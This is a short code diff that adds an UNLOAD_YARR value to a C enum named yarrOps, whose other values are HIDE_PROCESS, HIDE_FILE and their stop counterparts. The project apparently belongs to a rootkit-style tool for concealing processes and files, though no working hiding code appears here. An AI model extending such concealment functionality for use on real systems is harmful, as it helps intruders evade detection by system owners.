@@ -42,7 +42,8 @@ typedef enum {
 	HIDE_PROCESS,
 	STOP_HIDE_PROCESS,
 	HIDE_FILE,
-	STOP_HIDE_FILE
+	STOP_HIDE_FILE,
+	UNLOAD_YARR
 } yarrOps;
 
 // TODO: This will need more fields when we implement more functionality.
